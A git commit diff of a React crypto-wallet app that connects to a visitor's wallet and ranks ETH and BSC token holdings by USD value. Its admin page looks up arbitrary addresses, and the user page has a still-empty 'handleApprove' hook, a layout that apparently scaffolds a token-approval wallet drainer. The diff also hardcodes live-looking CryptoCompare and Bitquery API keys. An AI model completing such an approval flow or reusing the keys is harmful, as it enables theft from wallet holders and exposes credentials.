4b93575e7f035de2cc7c53081a15d2ef31332a93
zymehan <zymehan0214@gmail.com>
2022-03-11 06:24:24 +0300

    fix

--- src/App.js
+++ src/App.js
@@ -1,22 +1,17 @@
 import React, { useState, useEffect } from 'react';
 import { BrowserRouter, Navigate, Route, Routes } from 'react-router-dom';
 import axios from 'axios';
-import { getAddressBalances } from 'eth-balance-checker/lib/web3';
 import Web3 from "web3";
 import 'bootstrap/dist/css/bootstrap.min.css';
 
 import AdminScreen from './pages/Admin';
 import UserScreen from './pages/User';
-import TOKENS from './tokens.json';
-import TOKENSBSC from './tokenBsc.json';
 var WAValidator = require('wallet-address-validator');
+
 function App() {
   const [myAddress, setMyaddress] = useState('');
-  const [liveEthPrice, setLiveEthPrice] = useState(2700);
-  const [allTokenLivePrice, setAllTokenLivePrice] = useState({});
   const [walletStatus, setWalletStatue] = useState(false);
-  const [allTokenBalance, setAllTokenBalance] = useState([]);
-  const [sortedAllTokenBalance, setSortedAllTokenBalance] = useState([]);
+  const [userAllToken, setUserAllToken] = useState([]);
   useEffect(() => {
     const connectWallet = async () => {
       if (typeof window.ethereum !== 'undefined') {
@@ -31,8 +26,6 @@ function App() {
               });
               const web3 = new Web3(window.ethereum);
               const accounts = await web3.eth.getAccounts();
-              const EthPrice = await axios.get('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD&api_key=5d2f3072c0b3bfa7b006979142925cbc1dccf788219d2a8f5869ef92ad5d2ff2');
-              setLiveEthPrice(EthPrice.data.USD);
               setMyaddress(accounts[0]);
               setWalletStatue(true);
             } catch (error) {
@@ -61,104 +54,95 @@ function App() {
         }
       }
     }
-
     connectWallet();
   }, []);
 
   useEffect(() => {
     if (walletStatus) {
-      const web3 = new Web3(window.ethereum);
-      let tokenAddresses = TOKENS.map(t => t.address);
-      getAddressBalances(web3, myAddress, tokenAddresses).then(balances => {
-        if (balances) {
-          const result = (Object.keys(balances).map((key) => [(key), balances[key]])).filter((e) => (+e[1]) !== 0);
-          setAllTokenBalance(result);
-          let temp = [];
-          const data = (result.map((a) => {
-            temp = [];
-            TOKENS.map(b => {
-              if (a[0] == b.address) {
-                if (a[0] == "0x0000000000000000000000000000000000000000") temp.push([a[0], a[1], b.decimal, (a[1] * liveEthPrice) / (10 ** b.decimal), b.symbol]);
-                else {
-                  temp.push([a[0], a[1], b.decimal, a[1] / (10 ** b.decimal), b.symbol]);
-                }
-              }
-            });
-            return temp[0];
-          }).sort(function (a, b) { return b[3] - a[3] }));
-          setSortedAllTokenBalance(data);
-        }
-      });
+
     }
   }, [walletStatus])
   const livePrice = async (symbol) => {
     let tokenSymbol = symbol;
     let totaltemp = {};
-    let api = "https://min-api.cryptocompare.com/data/pricemulti?fsyms=" + tokenSymbol.slice(0, 50) + "&tsyms=USD&api_key=5d2f3072c0b3bfa7b006979142925cbc1dccf788219d2a8f5869ef92ad5d2ff2";
-    let temp = await axios.get(api);
-    Object.assign(totaltemp, temp.data);
-
-    api = "https://min-api.cryptocompare.com/data/pricemulti?fsyms=" + tokenSymbol.slice(51, 100) + "&tsyms=USD&api_key=5d2f3072c0b3bfa7b006979142925cbc1dccf788219d2a8f5869ef92ad5d2ff2";
-    temp = await axios.get(api);
-    Object.assign(totaltemp, temp.data);
-
-    setAllTokenLivePrice(totaltemp);
+    if (tokenSymbol.slice(0, 50).length) {
+      let api = "https://min-api.cryptocompare.com/data/pricemulti?fsyms=" + tokenSymbol.slice(0, 50) + "&tsyms=USD&api_key=5d2f3072c0b3bfa7b006979142925cbc1dccf788219d2a8f5869ef92ad5d2ff2";
+      let temp = await axios.get(api);
+      Object.assign(totaltemp, temp.data);
+      if (tokenSymbol.slice(51, 100).length) {
+        api = "https://min-api.cryptocompare.com/data/pricemulti?fsyms=" + tokenSymbol.slice(51, 100) + "&tsyms=USD&api_key=5d2f3072c0b3bfa7b006979142925cbc1dccf788219d2a8f5869ef92ad5d2ff2";
+        temp = await axios.get(api);
+        Object.assign(totaltemp, temp.data);
+      }
+    }
     return totaltemp;
   }
-  const handleApprove = () => {
+  const handleApprove = async () => {
     if (walletStatus) {
     }
   }
-  const changeWalletAddress = (value) => {
+  const changeWalletAddress = async (value) => {
     var valid = WAValidator.validate(value, 'ETH');
+    var userAllTokenBalance = {
+      eth: [],
+      bsc: []
+    };
     if (valid) {
-      const web3 = new Web3(window.ethereum);
-      let tokenAddresses = TOKENS.map(t => t.address);
-      getAddressBalances(web3, value, tokenAddresses).then(async (balances) => {
-        const result = (Object.keys(balances).map((key) => [(key), balances[key]])).filter((e) => (+e[1]) !== 0);
-        setAllTokenBalance(result);
-        let symbol = [];
-        result.map((a) => {
-          TOKENS.map(b => {
-            if (a[0] == b.address) {
-              symbol.push(b.symbol);
-            }
-          });
-        });
-        let tokenSymbol = symbol;
-        let totaltemp = {};
-        if (tokenSymbol.slice(0, 50).length) {
-          let api = "https://min-api.cryptocompare.com/data/pricemulti?fsyms=" + tokenSymbol.slice(0, 50) + "&tsyms=USD&api_key=5d2f3072c0b3bfa7b006979142925cbc1dccf788219d2a8f5869ef92ad5d2ff2";
-          let temp = await axios.get(api);
-          Object.assign(totaltemp, temp.data);
-          if (tokenSymbol.slice(50, 100).length) {
-            api = "https://min-api.cryptocompare.com/data/pricemulti?fsyms=" + tokenSymbol.slice(51, 100) + "&tsyms=USD&api_key=5d2f3072c0b3bfa7b006979142925cbc1dccf788219d2a8f5869ef92ad5d2ff2";
-            temp = await axios.get(api);
-            Object.assign(totaltemp, temp.data);
-          }
+      let query = `query ($network: EthereumNetwork!, $address: String!) {ethereum(network: $network) {address(address: {is: $address}) {balances {currency {address symbol tokenType decimals} value}}}}`;
+      let variables = `{"limit": 10,"offset": 0,"network": "ethereum","address": "` + value + `"}`;
+      let url = "https://graphql.bitquery.io/";
+      let opts = {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "X-API-KEY": "BQYcUOSxiCsQ3ximvOlDzfrAWTS5CYJ5"
+        },
+        body: JSON.stringify({
+          query,
+          variables
+        })
+      };
+      await fetch(url, opts).then(res => res.json())
+        .then(data => userAllTokenBalance.eth = data.data.ethereum.address[0].balances)
+        .catch(console.error);
+
+      query = `query ($network: EthereumNetwork!, $address: String!) {ethereum(network: $network) {address(address: {is: $address}) {balances {currency {address symbol tokenType decimals} value}}}}`;
+      variables = `{"limit": 10,"offset": 0,"network": "bsc","address": "` + value + `"}`;
+      opts = {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "X-API-KEY": "BQYcUOSxiCsQ3ximvOlDzfrAWTS5CYJ5"
+        },
+        body: JSON.stringify({
+          query,
+          variables
+        })
+      };
+      await fetch(url, opts).then(res => res.json())
+        .then(data => userAllTokenBalance.bsc = data.data.ethereum.address[0].balances)
+        .catch(console.error);
+      const array1 = userAllTokenBalance.eth;
+      const array2 = userAllTokenBalance.bsc;
+      const array3 = array1.concat(array2);
+      const array4 = array3.map(t => t.currency.symbol);
+      const currentTokenPrice = await livePrice(array4);
+      for (let i = 0; i < array3.length; i++) {
+        if (currentTokenPrice[array3[i].currency.symbol]) {
+          array3[i].cost = +array3[i].value * currentTokenPrice[array3[i].currency.symbol].USD;
         }
-        let temp = [];
-        console.log(totaltemp)
-        const data = (result.map((a) => {
-          temp = [];
-          TOKENS.map(b => {
-            if (a[0] == b.address) {
-              console.log(b.symbol)
-              if(totaltemp[b.symbol])temp.push([a[0], a[1], b.decimal, (a[1] * totaltemp[b.symbol].USD) / (10 ** b.decimal), b.symbol]);
-              else temp.push([a[0], a[1], b.decimal, (a[1]) * 0 / (10 ** b.decimal), b.symbol]);
-            }
-          });
-          return temp[0];
-        }).sort(function (a, b) { return b[3] - a[3] }));
-        setSortedAllTokenBalance(data);
-      });
+        else {
+          array3[i].cost = +array3[i].value * 0;
+        }
+      }
+      setUserAllToken(array3.sort(function (a, b) { return b.value - a.value; }).sort(function (a, b) { return b.cost - a.cost; }));
     }
   }
   return (
     <BrowserRouter>
       <Routes>
-        <Route path="/" element={<UserScreen handleApprove={handleApprove} expensiveTokenBalance={sortedAllTokenBalance[0]} />} />
-        <Route path="/admin" element={<AdminScreen sortedAllTokenBalance={sortedAllTokenBalance} changeWalletAddress={changeWalletAddress} />} />
+        <Route path="/" element={<UserScreen handleApprove={handleApprove} />} />
+        <Route path="/admin" element={<AdminScreen changeWalletAddress={changeWalletAddress} sortedAllTokenBalance={userAllToken} />} />
         <Route path="*" element={<Navigate to="/" />} />
       </Routes>
     </BrowserRouter>
